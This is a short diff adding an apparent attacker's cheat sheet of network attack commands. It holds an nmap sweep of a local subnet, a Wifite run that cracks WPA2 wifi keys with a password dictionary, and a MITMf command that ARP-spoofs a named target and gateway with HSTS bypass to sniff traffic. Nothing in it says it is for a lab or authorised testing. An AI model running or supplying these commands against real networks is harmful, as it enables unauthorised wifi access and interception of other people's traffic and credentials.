@@ -1,0 +1,10 @@
+//CHECK NETWORK
+nmap -sP 192.168.1.0/24
+
+// OPEN WIFI KEYS
+cd wpa2 
+./Wifite.py --dict '/root/wpa2/dict/CHOSE DICTIONARY'
+
+// SNIFF
+apt-get install mitmf
+mitmf -i wlan0 --target 192.168.1.33 --gateway 192.168.1.1 --arp --spoof --hsts
